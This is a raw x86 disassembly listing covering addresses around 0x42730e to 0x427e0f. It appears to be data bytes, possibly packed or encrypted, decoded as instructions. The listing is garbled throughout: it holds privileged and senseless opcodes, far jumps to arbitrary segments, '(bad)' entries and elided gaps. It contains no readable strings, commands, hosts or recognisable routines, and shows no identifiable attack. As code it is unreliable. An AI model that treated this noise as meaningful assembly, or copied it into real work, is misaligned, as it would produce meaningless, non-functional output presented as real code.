  42730e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42730f:	adc    ch,BYTE PTR [ebp-0x7654634a]
  427315:	cmp    eax,0x8ac8019c
  42731a:	cmp    ebp,edi
  42731c:	dec    esp
  42731d:	mov    bh,0x3c
  42731f:	cmp    DWORD PTR ds:0xfe2fb8cb,edi
  427325:	das    
  427326:	je     0x4272ea
  427328:	push   esp
  427329:	int3   
  42732a:	leave  
  42732b:	push   0x30ef8fa9
  427330:	in     al,dx
  427331:	mov    ds:0xe10725a8,al
  427336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427337:	pop    ebp
  427338:	test   DWORD PTR [ebx+0x2bb0f6c2],ecx
  42733e:	sub    bh,bh
  427340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427341:	mov    ch,0x9d
  427343:	sub    eax,0x40230b25
  427348:	dec    esp
  427349:	and    cl,al
  42734b:	add    edx,eax
  42734d:	jmp    0x4273bf
  42734f:	push   cs
  427350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427351:	test   eax,0x7fb10141
  427356:	retf   0xd2f
  427359:	jmp    0x4bc49539
  42735e:	pop    esp
  42735f:	jmp    0xb8a9:0x307dd480
  427366:	sbb    dl,BYTE PTR [ebp+0x1dfbeb06]
  42736c:	jbe    0x427307
  42736e:	call   0x8376abc1
  427373:	in     al,0x84
  427375:	fisttp DWORD PTR [eax]
  427377:	mov    ds:0x606d6db5,eax
  42737c:	cdq    
  42737d:	ror    edx,0x78
  427380:	jmp    0x427388
  427382:	adc    al,0xa0
  427384:	ret    0x780f
  427387:	int3   
  427388:	test   DWORD PTR [ebx-0x28],0xee5613f4
  42738f:	push   eax
  427390:	js     0x427407
  427392:	add    al,0x9b
  427394:	add    ecx,ebx
  427396:	dec    edi
  427397:	ss pop ebx
  427399:	cmc    
  42739a:	retf   0x2d96
  42739d:	cmp    eax,0xbb2f425e
  4273a2:	push   ds
  4273a3:	clc    
  4273a4:	cmp    eax,0xa07ef882
  4273a9:	stos   DWORD PTR es:[edi],eax
  4273aa:	adc    BYTE PTR [eax],cl
  4273ac:	push   eax
  4273ad:	cwde   
  4273ae:	lods   eax,DWORD PTR ds:[esi]
  4273af:	jns    0x4273af
  4273b1:	cmp    esp,DWORD PTR [esi+0x3e]
  4273b4:	cwde   
  4273b5:	idiv   BYTE PTR [esi-0x523dad03]
  4273bb:	aam    0x39
  4273bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4273be:	mov    bh,0x6a
  4273c0:	dec    eax
	...
  427431:	add    BYTE PTR [eax],al
  427433:	add    BYTE PTR [ecx+0x6f],ch
  427436:	mov    BYTE PTR [eax],cl
  427438:	mov    gs,edi
  42743a:	jmp    0xe38703ae
  42743f:	jmp    0xa120:0xab1b44b3
  427446:	add    DWORD PTR [eax],eax
  427448:	cmc    
  427449:	add    BYTE PTR [eax],al
  42744b:	add    BYTE PTR [ecx-0x78],dl
  42744e:	test   DWORD PTR [ebx-0x6c],edi
  427451:	and    dl,bh
  427453:	pop    ebx
  427454:	cmp    DWORD PTR [esi],edx
  427456:	addr16 in al,dx
  427458:	cmp    eax,0xea2f236d
  42745d:	std    
  42745e:	ss push es
  427460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427461:	sti    
  427462:	movsx  ebx,WORD PTR [edi]
  427465:	inc    ecx
  427466:	imul   edx,DWORD PTR [ebx+edx*2-0x6e8d000f],0xffffffd7
  42746e:	sbb    eax,0x78b74075
  427473:	adc    al,0xd1
  427475:	aad    0x79
  427477:	push   es
  427478:	call   0x755236e1
  42747d:	and    DWORD PTR cs:[ecx+esi*4-0x27],esi
  427482:	mul    DWORD PTR [ebp+ebx*4-0x46]
  427486:	xchg   ecx,eax
  427487:	ret    0x9b3c
  42748a:	add    edi,DWORD PTR [eax]
  42748c:	mov    DWORD PTR ds:0x1f49ed66,esi
  427492:	pop    es
  427493:	dec    edx
  427494:	or     eax,esp
  427496:	or     BYTE PTR [ebx-0x1cf5a1cf],bl
  42749c:	add    esi,DWORD PTR [edx-0x22]
  42749f:	test   BYTE PTR [ecx+0x1883eb72],0x75
  4274a6:	cdq    
  4274a7:	push   ecx
  4274a8:	test   BYTE PTR [ecx],0x50
  4274ab:	adc    ebx,ebp
  4274ad:	repnz and BYTE PTR [ecx-0x1a],dl
  4274b1:	clc    
  4274b2:	fucomi st,st(6)
  4274b4:	xchg   ebx,eax
  4274b5:	clts   
  4274b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4274b8:	test   DWORD PTR [edi],edx
  4274ba:	xchg   esp,eax
  4274bb:	push   edi
  4274bc:	cmp    eax,DWORD PTR [edi]
  4274be:	daa    
  4274bf:	push   ss
  4274c0:	fcomp  DWORD PTR [ecx-0x3c]
  4274c3:	stos   BYTE PTR es:[edi],al
  4274c4:	xor    al,0xeb
  4274c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4274c7:	test   eax,0xeab84d05
  4274cc:	lahf   
  4274cd:	mov    ebx,0x687f4fd8
  4274d2:	mov    ecx,0x7cbc1e8e
  4274d7:	icebp  
  4274d8:	ja     0x427468
  4274da:	and    al,0xf0
  4274dc:	xchg   BYTE PTR [edx],ah
  4274de:	iret   
  4274df:	lods   al,BYTE PTR ds:[esi]
  4274e0:	cmp    dl,BYTE PTR ds:0xa95598ab
  4274e6:	out    0x3c,eax
  4274e8:	inc    esi
  4274e9:	pop    ebp
  4274ea:	jl     0x427531
  4274ec:	cmp    BYTE PTR [ecx+esi*1+0x69],dl
  4274f0:	and    bl,BYTE PTR [ecx+edi*1-0x7ee2e174]
  4274f7:	cmp    eax,0xa8abe068
  4274fc:	cmp    esp,DWORD PTR [esi-0x47186f7c]
  427502:	leave  
  427503:	jle    0x4274c8
  427505:	mov    ds:0x69dd37dc,al
  42750a:	and    BYTE PTR [ebx-0x31],0xab
  42750e:	aas    
  42750f:	jae    0x4274a3
  427511:	sahf   
  427512:	scas   al,BYTE PTR es:[edi]
  427513:	dec    ebp
  427514:	jo     0x4274b5
  427516:	and    eax,0x17b7d57a
  42751b:	sub    al,0x73
  42751d:	lock cwde 
  42751f:	test   BYTE PTR ds:0xce62db48,dh
  427525:	dec    edx
  427526:	push   eax
  427527:	mov    ecx,0x73812517
  42752c:	mov    dh,0xe6
  42752e:	push   0x11a9d37e
  427533:	stos   BYTE PTR es:[edi],al
  427534:	aad    0xc6
  427536:	out    dx,al
  427537:	ret    0x49b5
  42753a:	mov    edx,ds
  42753c:	push   edx
  42753d:	popf   
  42753e:	pop    edi
  42753f:	sub    ebx,DWORD PTR [eax+eax*1]
	...
  4275b2:	add    BYTE PTR [eax],al
  4275b4:	adc    cl,bl
  4275b6:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4275bc:	mov    ds:0x439a8b87,al
  4275c1:	and    eax,esi
  4275c3:	jg     0x4275da
  4275c5:	mov    ds:0xf50001,al
  4275ca:	add    BYTE PTR [eax],al
  4275cc:	fisub  WORD PTR ds:0xbb64de3d
  4275d2:	sbb    eax,0xdd9647d1
  4275d7:	lea    ebx,[esi]
  4275d9:	and    esp,DWORD PTR [ebx]
  4275db:	sbb    al,0xf3
  4275dd:	and    ch,bh
  4275df:	cld    
  4275e0:	mov    edx,0x2bb87186
  4275e5:	add    eax,0x402dba62
  4275ea:	retf   
  4275eb:	ffreep st(5)
  4275ed:	or     BYTE PTR [esi+esi*8-0x2c53a5f3],bl
  4275f4:	xor    DWORD PTR [ebp+0x6e],0x17
  4275f8:	jmp    0xb8d9:0xe81bbc0f
  4275ff:	test   eax,0x58bafa4d
  427604:	pop    ebp
  427605:	nop
  427606:	retf   
  427607:	mov    ds:0xbcc92605,eax
  42760c:	addr16 push edi
  42760e:	cli    
  42760f:	fnstsw WORD PTR ds:0x1dc89269
  427615:	add    al,0x54
  427617:	call   0xf8cf:0xf3923a9c
  42761e:	sbb    al,0xe1
  427620:	push   ebp
  427621:	fstp   TBYTE PTR [ebx+0x30]
  427624:	xlat   BYTE PTR ds:[ebx]
  427625:	mov    ecx,0x583dcb85
  42762a:	jge    0x4275b8
  42762c:	icebp  
  42762d:	addps  xmm6,XMMWORD PTR [eax]
  427630:	ror    DWORD PTR ds:0x50b974ed,1
  427636:	adc    ecx,0x788f8270
  42763c:	adc    ebx,DWORD PTR [ebx+0x3]
  42763f:	lods   eax,DWORD PTR ds:[esi]
  427640:	frstor [eax+0x7ef6965a]
  427646:	pop    ss
  427647:	xor    edi,DWORD PTR [esi+0x17a7d6f0]
  42764d:	ss cmp eax,ecx
  427650:	leave  
  427651:	test   eax,0xfc2bce8b
  427656:	push   edx
  427657:	jo     0x427653
  427659:	iret   
  42765a:	xor    BYTE PTR [esi+0x4be73f46],bh
  427660:	cmc    
  427661:	ret    0xf60e
  427664:	add    al,0xe1
  427666:	sbb    al,0x15
  427668:	fs xchg esi,eax
  42766a:	sbb    al,0x24
  42766c:	and    al,0x90
  42766e:	mov    ebx,0x6693b849
  427673:	inc    edi
  427674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427675:	inc    edi
  427676:	into   
  427677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427678:	adc    eax,0x9e218e8d
  42767d:	clc    
  42767e:	fsub   QWORD PTR [esi]
  427680:	xchg   esp,eax
  427681:	(bad)  
  427682:	add    al,0x1c
  427684:	out    0xb8,eax
  427686:	adc    DWORD PTR [edi-0x765d894],ebx
  42768c:	mov    edi,0x75f47c35
  427691:	xchg   ebp,eax
  427692:	loopne 0x4276cf
  427694:	jmp    0x4276ce
  427696:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427697:	mov    eax,0x64a9ba20
  42769c:	sar    BYTE PTR [edx-0x5c],cl
  42769f:	xchg   ebp,eax
  4276a0:	scas   eax,DWORD PTR es:[edi]
  4276a1:	int3   
  4276a2:	mov    edx,0xd268c653
  4276a7:	js     0x4276de
  4276a9:	push   ebx
  4276aa:	adc    eax,0x96b1312f
  4276af:	fnstcw WORD PTR [ecx]
  4276b1:	mov    dh,0x2a
  4276b3:	jae    0x4276c9
  4276b5:	dec    ebx
  4276b6:	fs pop esi
  4276b8:	push   ecx
  4276b9:	stos   BYTE PTR es:[edi],al
  4276ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4276bb:	dec    esp
  4276bc:	mov    edi,0xf1a9c3dc
	...
  427731:	add    BYTE PTR [eax],al
  427733:	add    BYTE PTR [eax-0xd53173],bh
  427739:	imul   edi,esp,0xffffff9f
  42773c:	and    al,0x37
  42773e:	or     al,0x49
  427740:	xchg   ebp,eax
  427741:	cld    
  427742:	sbb    al,0xa
  427745:	mov    ds:0xf50001,eax
  42774a:	add    BYTE PTR [eax],al
  42774c:	sbb    eax,0x2e
  42774f:	aad    0x50
  427751:	gs or  eax,0xa1beb3b4
  427757:	test   BYTE PTR [ebp+0x6d80815a],bh
  42775d:	push   0x7e24867e
  427762:	jl     0x427740
  427764:	ret    0x9073
  427767:	push   cs
  427768:	adc    al,0x65
  42776a:	dec    edi
  42776b:	inc    edi
  42776c:	mov    DWORD PTR [ecx+0x4371743c],ebp
  427772:	inc    ecx
  427773:	mov    ebx,0x3d4e630b
  427778:	ret    0xdb79
  42777b:	outs   dx,DWORD PTR ds:[esi]
  42777c:	jb     0x4277d7
  42777e:	ins    BYTE PTR es:[edi],dx
  42777f:	dec    DWORD PTR fs:[ebp-0x4b]
  427783:	or     cl,dl
  427785:	xchg   ebx,eax
  427786:	mov    ebx,0x2bb04c51
  42778b:	add    DWORD PTR [ecx],0xe4f9d45b
  427791:	fbld   TBYTE PTR [ebx]
  427793:	jb     0x427769
  427795:	mov    ds:0x6fd207f2,eax
  42779a:	sbb    DWORD PTR [ecx+0x3e8f4629],esi
  4277a0:	cmp    al,0x4a
  4277a2:	or     al,0x82
  4277a4:	pop    es
  4277a5:	xchg   edx,eax
  4277a6:	test   BYTE PTR es:[esi-0x316fc55c],bh
  4277ad:	in     eax,dx
  4277ae:	sti    
  4277af:	(bad)  
  4277b0:	mov    WORD PTR [ecx+0x40b9678e],es
  4277b6:	xor    eax,0x243bc226
  4277bb:	or     BYTE PTR [ebx-0x385082a9],al
  4277c1:	push   ds
  4277c2:	sbb    eax,0xe22a9a15
  4277c7:	neg    ch
  4277c9:	push   0xffffffd1
  4277cb:	iret   
  4277cc:	retf   
  4277cd:	jle    0x4277f6
  4277cf:	pop    esi
  4277d0:	inc    eax
  4277d1:	mov    al,ds:0x2166d308
  4277d6:	dec    esp
  4277d7:	nop
  4277d8:	and    DWORD PTR [ebx],ecx
  4277da:	xchg   esi,eax
  4277db:	jle    0x427822
  4277dd:	cld    
  4277de:	push   edi
  4277df:	add    cl,BYTE PTR [esi]
  4277e1:	dec    edx
  4277e2:	cs lahf 
  4277e4:	test   DWORD PTR [ecx+ebp*8],0xa6508c7
  4277eb:	retf   
  4277ec:	repnz aad 0xdc
  4277ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4277f0:	pop    es
  4277f1:	cld    
  4277f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4277f3:	sub    ch,BYTE PTR [edx-0x74]
  4277f6:	add    ecx,DWORD PTR [esi+0x43]
  4277f9:	sub    DWORD PTR [edx-0x1121adf0],ebp
  4277ff:	adc    DWORD PTR [edi],0xffffffee
  427802:	mov    ds:0x6caaf010,eax
  427807:	pop    eax
  427808:	add    al,0xc4
  42780a:	popa   
  42780b:	pop    ebx
  42780c:	or     bh,0x3d
  42780f:	sub    cl,BYTE PTR [eiz*4-0x7e43b0e1]
  427816:	xor    DWORD PTR [esi],edx
  427818:	pop    es
  427819:	sub    al,0x8c
  42781b:	dec    esp
  42781c:	jae    0x4277f8
  42781e:	into   
  42781f:	xchg   edx,eax
  427820:	xor    BYTE PTR [edi+ebx*8+0x20545544],cl
  427827:	jns    0x427834
  427829:	iret   
  42782a:	xlat   BYTE PTR ds:[ebx]
  42782b:	in     al,0x5a
  42782d:	sbb    ah,BYTE PTR [ebx]
  42782f:	xchg   ebx,ecx
  427831:	(bad)  
  427832:	xchg   ecx,eax
  427833:	and    dh,BYTE PTR [ebx-0x3bdd60a4]
  427839:	xlat   BYTE PTR ds:[ebx]
  42783a:	dec    edx
  42783b:	pop    ecx
  42783c:	xor    al,BYTE PTR ds:0x1c8e48
	...
  4278b2:	add    BYTE PTR [eax],al
  4278b4:	mov    WORD PTR [esi+0x7d],cs
  4278b7:	jge    0x4278b8
  4278b9:	jg     0x427847
  4278bb:	dec    DWORD PTR [eax-0x5e]
  4278be:	(bad)  
  4278bf:	xchg   ecx,eax
  4278c0:	cld    
  4278c1:	retf   0xea22
  4278c4:	jmp    DWORD PTR [ebx+0xf50001]
  4278ca:	add    BYTE PTR [eax],al
  4278cc:	enter  0x60b5,0x19
  4278d0:	jae    0x427924
  4278d2:	sbb    ecx,DWORD PTR [ebp+0x2e63c0d1]
  4278d8:	cs pusha 
  4278da:	adc    ebp,esp
  4278dc:	mov    ch,0xa9
  4278de:	fwait
  4278df:	popf   
  4278e0:	xlat   BYTE PTR ds:[ebx]
  4278e1:	out    0x61,eax
  4278e3:	inc    ebp
  4278e4:	cmc    
  4278e5:	adc    edx,0xffffffba
  4278e8:	pop    ebp
  4278e9:	icebp  
  4278ea:	mov    eax,0xd5c3ed95
  4278ef:	dec    ecx
  4278f0:	sti    
  4278f1:	mov    WORD PTR [edx+0x343f4dec],?
  4278f7:	mov    ah,0xa2
  4278f9:	test   eax,esi
  4278fb:	ja     0x42796d
  4278fd:	and    DWORD PTR [ecx+0x2c],esp
  427900:	repz xchg edx,eax
  427902:	jbe    0x42789d
  427904:	pop    ds
  427905:	sbb    bh,0xdd
  427908:	mov    cl,BYTE PTR [esi]
  42790a:	mov    eax,ds:0xc2e07b3b
  42790f:	ret    
  427910:	and    BYTE PTR [ecx+0x55],0x44
  427914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427915:	sahf   
  427916:	mov    edi,0x6b1ba72b
  42791b:	(bad)  
  42791c:	daa    
  42791d:	in     eax,dx
  42791e:	stos   DWORD PTR es:[edi],eax
  42791f:	jmp    0x1e60d34f
  427924:	inc    ebp
  427925:	dec    esi
  427926:	lea    eax,[eax*2+0x4561a031]
  42792d:	rol    DWORD PTR ds:0xc7a91be,1
  427933:	xchg   edi,eax
  427934:	xchg   ecx,eax
  427935:	jmp    FWORD PTR [esi-0x40120a35]
  42793b:	pop    ecx
  42793c:	into   
  42793d:	xchg   edx,eax
  42793e:	jmp    0xe33959e1
  427943:	outs   dx,DWORD PTR ds:[esi]
  427944:	inc    edx
  427945:	(bad)  
  427946:	outs   dx,DWORD PTR ds:[esi]
  427947:	mul    DWORD PTR [ebx]
  427949:	push   0x662f340
  42794e:	popa   
  42794f:	push   edi
  427950:	out    dx,eax
  427951:	fsubr  DWORD PTR [edi-0xc]
  427954:	jnp    0x4279aa
  427956:	test   eax,0x9d51c0d
  42795b:	jne    0x42792c
  42795d:	imul   ecx,DWORD PTR [ebx-0x261ff839],0xbb771620
  427967:	shl    DWORD PTR [esi+0x68c24b67],0xe0
  42796e:	(bad)  
  42796f:	cmp    BYTE PTR [edi+0x75],bl
  427972:	cmp    al,0xb3
  427974:	pop    edx
  427975:	enter  0x6f2c,0xc2
  427979:	jmp    0x6fd38da8
  42797e:	mov    dl,0xd3
  427980:	popa   
  427981:	out    0x16,al
  427983:	xchg   ebp,eax
  427984:	(bad)  
  427985:	and    eax,0xe80e3ea7
  42798a:	lds    esi,FWORD PTR [esi+0x628366e9]
  427990:	pop    ds
  427991:	out    dx,al
  427992:	and    BYTE PTR [edi+0x23b6c4de],ah
  427998:	enter  0x76f5,0xbf
  42799c:	pop    eax
  42799d:	dec    ecx
  42799e:	or     dh,BYTE PTR [ecx-0x70ae9038]
  4279a4:	in     al,0xd
  4279a6:	or     ch,BYTE PTR [ecx-0x92327f0]
  4279ac:	add    al,0x1a
  4279ae:	repz js 0x4279f0
  4279b1:	in     eax,dx
  4279b2:	ss add ecx,eax
  4279b5:	mov    edx,0x197b1c0a
  4279ba:	retf   
  4279bb:	idiv   ah
  4279bd:	add    eax,0xb285b1
	...
  427a32:	add    BYTE PTR [eax],al
  427a34:	cdq    
  427a35:	sub    BYTE PTR ds:0xdb77bd56,cl
  427a3b:	out    dx,eax
  427a3c:	das    
  427a3d:	mov    ch,0xeb
  427a3f:	aam    0x3
  427a41:	repz scas eax,DWORD PTR es:[edi]
  427a43:	test   eax,0x1a4f4
  427a48:	cmc    
  427a49:	add    BYTE PTR [eax],al
  427a4b:	add    BYTE PTR [eax-0x3b077091],bh
  427a51:	test   BYTE PTR [ebp-0x2],cl
  427a54:	test   DWORD PTR [esi+0x36],0x2997452d
  427a5b:	in     al,0xe2
  427a5d:	push   edi
  427a5e:	gs push esp
  427a60:	daa    
  427a61:	rcr    BYTE PTR [esi+0x54],1
  427a64:	je     0x4279f9
  427a66:	sub    dh,ah
  427a68:	aam    0xdb
  427a6a:	xchg   esp,eax
  427a6b:	and    BYTE PTR [edx-0x6d],cl
  427a6e:	idiv   DWORD PTR [ebx]
  427a70:	pop    ss
  427a71:	ss pop ebx
  427a73:	cmp    esp,esp
  427a75:	cmp    al,0xb2
  427a77:	sbb    DWORD PTR [edi],ecx
  427a79:	mov    cl,0xe7
  427a7b:	push   ebx
  427a7c:	cmp    dl,ch
  427a7e:	mov    bh,0x57
  427a80:	das    
  427a81:	sti    
  427a82:	cmp    bl,BYTE PTR [esi]
  427a84:	xor    al,0x11
  427a86:	cs test al,0x1e
  427a89:	xchg   ebx,eax
  427a8a:	pop    esp
  427a8b:	hlt    
  427a8c:	repz shl BYTE PTR [eax-0x21e19927],cl
  427a93:	jmp    0x7e4b93f2
  427a98:	ret    
  427a99:	mov    edi,0x21f2c7be
  427a9e:	loop   0x427a48
  427aa0:	leave  
  427aa1:	(bad)  
  427aa2:	ds loop 0x427aba
  427aa5:	adc    ebp,DWORD PTR [ecx+edi*2-0x5a]
  427aa9:	mov    edi,0x1ac1c06d
  427aae:	fstp   TBYTE PTR [ecx+ecx*4+0x703ebca5]
  427ab5:	in     al,dx
  427ab6:	xor    DWORD PTR [edi-0x47],ebx
  427ab9:	aad    0x33
  427abb:	adc    ecx,DWORD PTR [ebx]
  427abd:	push   esp
  427abe:	dec    ebx
  427abf:	and    al,0xb8
  427ac1:	push   eax
  427ac2:	aaa    
  427ac3:	adc    al,0xe
  427ac5:	clc    
  427ac6:	mov    dh,0x3c
  427ac8:	pusha  
  427ac9:	cmp    al,0xa1
  427acb:	mov    ebx,0x350418b0
  427ad0:	jg     0x427a8d
  427ad2:	repnz dec esi
  427ad4:	push   ebx
  427ad5:	mov    cl,0x73
  427ad7:	stos   BYTE PTR es:[edi],al
  427ad8:	xchg   ebx,edi
  427ada:	adc    ch,BYTE PTR [edx]
  427adc:	dec    ecx
  427add:	mov    esi,0xb290bccf
  427ae2:	dec    edx
  427ae3:	mov    esi,0xa59ddb35
  427ae8:	dec    edi
  427ae9:	dec    esp
  427aea:	rcr    BYTE PTR [ebx-0x891b6a4],0x19
  427af1:	mov    ecx,0xaac2e6a4
  427af6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427af7:	dec    ebp
  427af8:	addr16 add eax,0xabb7c60f
  427afe:	ret    
  427aff:	retf   
  427b00:	dec    esp
  427b01:	jmp    0xcd388649
  427b06:	loopne 0x427b4d
  427b08:	xchg   BYTE PTR [ecx+0x2d980d6],bh
  427b0e:	shr    DWORD PTR [esi-0x37],cl
  427b11:	mov    ch,BYTE PTR [edi-0x7d27fc64]
  427b17:	xor    edi,DWORD PTR [edx]
  427b19:	aam    0x99
  427b1b:	test   eax,0x7f51b3cd
  427b20:	sbb    al,0x4a
  427b22:	sub    eax,0xd16f9b13
  427b27:	inc    edi
  427b28:	push   edx
  427b29:	xchg   BYTE PTR [ecx],al
  427b2b:	ror    eax,1
  427b2d:	fwait
  427b2e:	mov    ch,0xff
  427b30:	cmp    DWORD PTR [ecx-0x6c],edi
  427b33:	push   0x2f
  427b35:	push   esi
  427b36:	pop    esi
  427b37:	or     al,0xea
  427b39:	test   al,0x4e
  427b3b:	fwait
  427b3c:	into   
  427b3d:	xchg   ebp,eax
  427b3e:	lea    ecx,[ecx+0x1b]
	...
  427bb4:	loop   0x427c16
  427bb6:	test   DWORD PTR [esi+0x74f3f787],esi
  427bbc:	mov    eax,0x9714fe65
  427bc1:	cmp    BYTE PTR [eax+0x34],0xe9
  427bc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427bc6:	add    DWORD PTR [eax],eax
  427bc8:	cmc    
  427bc9:	add    BYTE PTR [eax],al
  427bcb:	add    BYTE PTR [edi+0x3a],dh
  427bce:	mov    ds:0x7b171c1e,al
  427bd3:	jbe    0x427b8c
  427bd5:	test   BYTE PTR [edi],bl
  427bd7:	mov    eax,ds:0x43b4f1fb
  427bdc:	xlat   BYTE PTR ds:[ebx]
  427bdd:	aam    0x24
  427bdf:	outs   dx,DWORD PTR ds:[esi]
  427be0:	pop    ebx
  427be1:	stc    
  427be2:	mov    esi,DWORD PTR [ebx+ecx*1-0x6b845087]
  427be9:	mov    ch,dl
  427beb:	test   bl,0xb
  427bee:	jge    0x427be3
  427bf0:	jmp    0x427bd5
  427bf2:	sub    DWORD PTR [ebp+0x256a0acb],ebp
  427bf8:	sub    ebp,ebp
  427bfa:	inc    ebp
  427bfb:	push   es
  427bfc:	lahf   
  427bfd:	cld    
  427bfe:	retf   0xecf5
  427c01:	call   0x7cad:0x5b624aa4
  427c08:	mov    edx,0xf600d182
  427c0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c0f:	daa    
  427c10:	mov    ecx,0xa6d131ec
  427c15:	jge    0x427bfa
  427c17:	popf   
  427c18:	sub    bl,ch
  427c1a:	ss pop esi
  427c1c:	mov    bh,0xc
  427c1e:	adc    DWORD PTR [esi],esi
  427c20:	das    
  427c21:	sahf   
  427c22:	add    al,0x1
  427c24:	xchg   edx,eax
  427c25:	pop    es
  427c26:	jge    0x427c79
  427c28:	mov    esp,cs
  427c2a:	and    BYTE PTR [ebx+0x4c62feb8],ah
  427c30:	xchg   esi,eax
  427c31:	das    
  427c32:	cmp    al,0x60
  427c34:	adc    bl,BYTE PTR [ecx+0x6c]
  427c37:	jo     0x427c9d
  427c39:	xor    eax,0x5ecc589
  427c3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c3f:	leave  
  427c40:	lahf   
  427c41:	arpl   bx,cx
  427c43:	adc    ebp,DWORD PTR [ebx+0x9]
  427c46:	sub    eax,0x1f04b538
  427c4b:	dec    esi
  427c4c:	inc    esi
  427c4d:	es lock cmp eax,0xfb3f4e76
  427c54:	mov    ebx,0x7aa90d09
  427c59:	jbe    0x427cba
  427c5b:	sbb    eax,eax
  427c5d:	cmp    al,0x5d
  427c5f:	mov    ds:0xaeb520a5,al
  427c64:	sahf   
  427c65:	push   esi
  427c66:	dec    esp
  427c67:	stos   DWORD PTR es:[edi],eax
  427c68:	in     eax,dx
  427c69:	push   ds
  427c6a:	xchg   BYTE PTR [edi-0x4d],bl
  427c6d:	mov    bh,0x46
  427c6f:	pop    ss
  427c70:	and    esi,esp
  427c72:	enter  0xf389,0xa5
  427c76:	jbe    0x427c37
  427c78:	mov    dl,0x3a
  427c7a:	adc    eax,0xf59c231e
  427c7f:	(bad)  
  427c80:	mov    al,ds:0x6b88bf6f
  427c85:	push   ss
  427c86:	int    0x5b
  427c88:	int    0x1
  427c8a:	cmp    DWORD PTR [ebp+0x3b839e6f],edi
  427c90:	sbb    eax,0xd8d48235
  427c95:	les    esi,FWORD PTR [eax]
  427c97:	fs or  eax,0xf64c6cec
  427c9d:	cmp    BYTE PTR [ebx],bh
  427c9f:	data16 ja 0x427cf5
  427ca2:	test   DWORD PTR fs:[esi],esi
  427ca5:	push   ds
  427ca6:	fstp   DWORD PTR [esi+0x7b]
  427ca9:	faddp  st(2),st
  427cab:	(bad)  
  427cac:	idiv   BYTE PTR [esi-0x1a1fd9b1]
  427cb2:	adc    DWORD PTR [edx],0x4e36172e
  427cb8:	inc    esi
  427cb9:	xchg   ecx,eax
  427cba:	and    esi,eax
  427cbc:	fbld   TBYTE PTR [esi+0x4a]
  427cbf:	sahf   
  427cc0:	jp     0x427cc2
	...
  427d32:	add    BYTE PTR [eax],al
  427d34:	or     dh,BYTE PTR [ecx-0xc040c9f]
  427d3a:	call   0xf4a1:0xdc63ecf9
  427d41:	xchg   ebx,eax
  427d42:	iret   
  427d43:	pushf  
  427d44:	fisub  WORD PTR [esi+0xf50001]
  427d4a:	add    BYTE PTR [eax],al
  427d4c:	cmp    ebp,edx
  427d4e:	and    BYTE PTR [eax-0x74],ah
  427d51:	pop    ecx
  427d52:	dec    eax
  427d53:	hlt    
  427d54:	push   0xffffff8f
  427d56:	jecxz  0x427dac
  427d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d59:	push   esi
  427d5a:	rcl    BYTE PTR [edi],0xf6
  427d5d:	loopne 0x427d0b
  427d5f:	pop    ebp
  427d61:	repnz mov ds:0x76872d5e,eax
  427d67:	jle    0x427d47
  427d69:	stc    
  427d6a:	pop    ds
  427d6b:	mov    esp,0xb1957f49
  427d70:	aaa    
  427d71:	and    eax,0x6e79bbc7
  427d76:	dec    edi
  427d77:	mov    ebp,ecx
  427d79:	call   0xd85f:0xc1bd4e80
  427d80:	mov    eax,ds:0xffbf3719
  427d85:	test   bl,ch
  427d87:	pop    ecx
  427d88:	sbb    eax,0x610eec04
  427d8d:	xchg   ebp,eax
  427d8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d8f:	pop    es
  427d90:	cmp    edi,DWORD PTR [edi-0x8a13c5f]
  427d96:	in     al,0xf5
  427d98:	shr    edx,0xe7
  427d9b:	push   0x22556e2
  427da0:	mov    al,0xb4
  427da2:	jmp    0x2031:0x577f97cb
  427da9:	sub    DWORD PTR [ebx-0x4cc97ac6],ebp
  427daf:	cmp    al,0xd7
  427db1:	out    dx,eax
  427db2:	pop    ebp
  427db3:	mov    BYTE PTR [esi+eax*8+0x75a89701],0x8a
  427dbb:	pop    ebp
  427dbc:	test   BYTE PTR [ecx+0x7a],0xf8
  427dc0:	nop
  427dc1:	popf   
  427dc2:	sbb    BYTE PTR [ecx-0x7b],al
  427dc5:	or     cl,BYTE PTR [ecx]
  427dc7:	mov    esp,0x20cf962d
  427dcc:	mov    eax,0x990779b4
  427dd1:	ins    DWORD PTR es:[edi],dx
  427dd2:	pop    ds
  427dd3:	pop    edi
  427dd4:	das    
  427dd5:	or     DWORD PTR [ecx-0xf9b02ee],ebx
  427ddb:	push   edi
  427ddc:	xchg   DWORD PTR [esi-0x48bee0e],edi
  427de2:	pop    edi
  427de3:	or     DWORD PTR ds:[edi-0x68],ecx
  427de7:	cmp    eax,0x973270bf
  427dec:	push   cs
  427ded:	xchg   edi,eax
  427dee:	test   DWORD PTR [edi-0x6e],esi
  427df1:	or     eax,0x6402ffae
  427df6:	mov    ds:0x51507813,al
  427dfb:	mov    ah,BYTE PTR [edx]
  427dfd:	push   ebx
  427dfe:	setae  BYTE PTR [eax]
  427e01:	sar    BYTE PTR [edi],0x7
  427e04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e05:	fisubr DWORD PTR [ebx]
  427e07:	faddp  st(7),st
  427e09:	or     al,0xff
  427e0b:	test   al,0x93
  427e0d:	jno    0x427d8f
  427e0f:	frstor [esi]
